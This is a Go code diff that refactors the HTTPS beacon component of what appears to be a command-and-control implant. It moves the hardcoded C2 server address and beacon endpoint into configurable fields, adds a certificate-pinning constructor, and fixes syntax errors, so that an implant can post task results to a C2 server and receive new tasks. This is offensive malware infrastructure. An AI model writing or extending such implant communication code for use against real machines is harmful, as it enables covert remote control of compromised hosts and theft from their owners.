@@ -13,27 +13,30 @@ import (
 	"time"
 )
 
-const (
-	// TODO: these should be passed in form main when initalizing HTTPSCommun or smthign
-	// TODO: would use the same DOMAIN for HTTPS + DNS -> rename to these consts to be idiomatic (see above)
-	C2HTTPSURI            = "https://localhost"
-	C2HTTPSBEACONENDPOINT = "/implant/beacon"
-)
-
 type HTTPSC2TaskRequest struct {
 	ID       uint                   `json:"id"`
 	TaskType string                 `json:"type"`
 	Options  map[string]interface{} `json:"options"`
 }
 
-// TODO: store ImplantID in HTTPSC2Communicator + DNSC2Communicator (after registration?)
 type HTTPSC2Communicator struct {
-	// Endpoints? #TODO
-	// URI? #TODO
-	Client *http.Client
+	Client                *http.Client
+	C2HTTPSBeaconEndpoint string
+	C2Domain              string
 }
 
-func NewHTTPSC2Communicator() *HTTPSC2Communicator {
+func NewHTTPS(C2Domain, C2HTTPSBeaconEndpoint string) *HTTPSC2Communicator {
+	return &HTTPSC2Communicator{
+		Client: &http.Client{
+			Timeout: time.Second * 10,
+		},
+		C2HTTPSBeaconEndpoint: C2HTTPSBeaconEndpoint,
+		C2Domain:              C2Domain,
+	}
+}
+
+// TODO: do for SSL pinning , fix
+func NewSecureHTTPSC2Communicator() *HTTPSC2Communicator {
 	// Replace with your pinned public key hash
 	pinnedKey := "zEqbIbO2UKzMS+r9AsFvmchbzduA0R88nNt4SzVyudg="
 
@@ -91,7 +94,8 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*ta
 	}
 
 	// 2. Build request
-	req, err := http.NewRequest(http.MethodPost, C2HTTPSURI+C2HTTPSBEACONENDPOINT, bytes.NewReader(body))
+	uri := "https://" + h.C2Domain + h.C2HTTPSBeaconEndpoint
+	req, err := http.NewRequest(http.MethodPost, uri, bytes.NewReader(body))
 	if err != nil {
 		return nil, fmt.Errorf("create request: %w", err)
 	}
@@ -147,10 +151,10 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*ta
 }
 
 type ConfigureStandIn struct {
-	newConfigureValues map[string]interface,
+	newConfigureValues map[string]interface{}
 }
 
-func NewConfigureStandIn(newConfigValues map[string]interface{}) ConfigureStandInm{
+func NewConfigureStandIn(newConfigValues map[string]interface{}) ConfigureStandIn {
 	return ConfigureStandIn{
 		newConfigureValues: newConfigValues,
 	}
